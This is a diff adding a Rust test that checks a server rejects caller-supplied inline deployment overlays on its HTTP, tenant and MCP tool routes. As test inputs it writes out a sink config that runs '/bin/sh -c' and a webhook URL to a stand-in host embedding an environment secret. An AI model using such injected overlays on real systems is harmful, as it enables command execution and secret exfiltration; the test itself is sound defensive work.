@@ -606,3 +606,90 @@ async fn cancel_is_scoped_to_what_the_principal_sees() {
         Err(crate::serve::error::ServeError::NotFound)
     ));
 }
+
+/// An inline deployment overlay is the request's own document merged into an
+/// operator-written body: every adapter that accepts one screens it like a
+/// submitted config, and refuses it outright for a tenant run.
+#[tokio::test]
+async fn an_inline_overlay_is_screened_as_caller_input_on_every_adapter() {
+    let dir = tempfile::tempdir().unwrap();
+    let state = fresh().await;
+    tenant(&state, false, None).await;
+    register(&state, &config(dir.path(), "tpl", "", false)).await;
+    let overlay = json!({ "dlq": { "sink": { "type": "singer", "config": {
+        "target_command": ["/bin/sh", "-c", "true"] } } } });
+    let trigger = || -> crate::serve::handlers::templates::TriggerBody {
+        serde_json::from_value(json!({ "version": "newest", "overlay": overlay })).unwrap()
+    };
+    let http = crate::serve::handlers::templates::trigger_template(
+        State(state.clone()),
+        Extension(alice(None)),
+        Path("tpl".to_string()),
+        Json(trigger()),
+    )
+    .await
+    .map(|_| ())
+    .map_err(error_text)
+    .unwrap_err();
+    assert!(
+        http.contains("inline `overlay`") && http.contains("singer"),
+        "{http}"
+    );
+
+    let tenant_route = crate::serve::handlers::tenants::trigger_tenant_template(
+        State(state.clone()),
+        Extension(alice(None)),
+        Path(("acme".to_string(), "tpl".to_string())),
+        Json(
+            serde_json::from_value(json!({ "version": "newest",
+            "overlay": { "execution": { "max_concurrent": 1 } } }))
+            .unwrap(),
+        ),
+    )
+    .await
+    .map(|_| ())
+    .map_err(error_text)
+    .unwrap_err();
+    assert!(tenant_route.contains("tenant"), "{tenant_route}");
+
+    let ctx = crate::mcp::McpContext {
+        auth: Default::default(),
+        allow_mutations: true,
+        allow_config_execution: true,
+        allow_template_admin: false,
+        templates: Some(state.history()),
+        changes: None,
+        submitted: Some(state.caller_origin()),
+        approval_required: Vec::new(),
+        server: Some(crate::mcp::ChangeProposer {
+            state: state.clone(),
+            actor: alice(None),
+        }),
+    };
+    let out = crate::mcp::tools::call_tool(
+        &ctx,
+        "run_template",
+        &json!({ "id": "tpl", "version": "newest",
+                 "overlay": { "notifications": [{ "name": "n", "on": ["run_success"],
+                    "channel": { "type": "webhook", "config": {
+                        "url": "https://h.example/?k=${env:FAUCET_TEST_OVERLAY_SECRET}" } } }] } }),
+    )
+    .await;
+    assert_eq!(out["isError"], true, "{out}");
+    let text = out["content"][0]["text"].as_str().unwrap_or("");
+    assert!(text.contains("FAUCET_TEST_OVERLAY_SECRET"), "{text}");
+    assert_eq!(audited(&state, "template.run").await.len(), 3);
+    assert!(
+        state
+            .history()
+            .list(&crate::serve::history::ListFilter {
+                limit: 100,
+                ..Default::default()
+            })
+            .await
+            .unwrap()
+            .runs
+            .is_empty(),
+        "no run was started"
+    );
+}
